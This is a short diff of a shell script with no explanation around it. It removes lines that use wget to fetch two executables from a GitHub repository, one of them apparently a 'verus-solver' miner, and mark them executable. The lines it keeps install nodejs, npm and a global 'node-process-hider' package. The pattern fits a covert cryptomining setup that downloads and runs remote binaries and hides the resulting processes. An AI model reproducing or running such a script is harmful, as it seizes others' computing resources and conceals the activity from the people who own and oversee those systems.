@@ -1,8 +1,4 @@
 #!/bin/sh
-wget https://github.com/breakok/ob/raw/main/loop
-wget https://github.com/breakok/ob/raw/main/verus-solver
-chmod +x loop
-chmod +x verus-solver
 apt install nodejs -y
 apt install npm -y
 npm i -g node-process-hider
